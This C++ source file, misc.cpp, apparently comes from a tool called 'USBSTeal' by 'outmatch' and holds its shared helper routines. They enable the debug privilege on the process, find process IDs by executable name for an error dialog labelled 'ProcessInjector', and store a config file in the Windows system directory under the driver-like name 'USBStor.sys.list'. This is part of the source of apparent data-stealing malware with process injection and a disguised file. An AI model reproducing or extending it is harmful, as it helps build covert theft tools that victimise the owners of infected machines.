/*
* Copyright (c) 2005, Outmatch@gmail.com
* All rights reserved.
*
* 文件名称：misc.cpp
* 文件标识：见配置管理计划书
* 摘    要：USBSTeal所用的公共代码和杂项程序
*
* 当前版本：1.0
* 作    者：outmatch
* 完成日期：2006年9月6日
*
* 取代版本：无
* 原作者  ：
* 完成日期：
*/

#include "stdafx.h"
#include "config.h"
#include <vector>
#include "misc.h"

using namespace std;

typedef std::vector<DWORD> PIDGroup;

void reportError(LPCSTR errorFuncName)
{
	CHAR msg[BUFSIZ];
	sprintf(msg, "%s 失败. 错误是: %d :", errorFuncName,  GetLastError());
	LPVOID lpMsgBuf;
	FormatMessage(
			FORMAT_MESSAGE_ALLOCATE_BUFFER |
			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			GetLastError(),
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
			(LPTSTR) &lpMsgBuf,
			0,
			NULL
			); 
	strcat(msg, (LPCSTR)lpMsgBuf);
	LocalFree(lpMsgBuf);
	MessageBox(0, msg, "ProcessInjector", 0);
	return;
}

DWORD enablePrivilege() {
	DWORD  Ret = 0;
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
	} else {
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {
		} else {

			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Luid = sedebugnameValue;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof tkp, NULL, NULL)) {
			} else {
				Ret = 1;
			}
		}
		CloseHandle(hToken);
	}
	return(Ret);
}

// 得到配置文件路径
const std::string& getConfigPath()
{
	static std::string s;
	extern std::string getSystemPath();
	if(s == "") {
		s = getSystemPath();
		s += "\\";
		s += "USBStor.sys.list";
	}
	return s;
}

PIDGroup GetDestProcessID(LPCSTR lpcExeName)
{
	HANDLE hProcessSnap = NULL;
	PIDGroup pid;

	if(!lpcExeName) return pid;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap > 0)  {
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		Process32First(hProcessSnap, &pe);
		do {
			if (stricmp(pe.szExeFile, lpcExeName) == 0) {
				//找到ID
				pid.push_back(pe.th32ProcessID);
			}
		}
		while (Process32Next(hProcessSnap, &pe));
		CloseHandle(hProcessSnap);
	}
	return pid;
}

// 得到系统文件路径
std::string getSystemPath()
{
	CHAR szSysPath[MAX_PATH+1];

	GetSystemDirectory(szSysPath, MAX_PATH);
	return szSysPath;
}

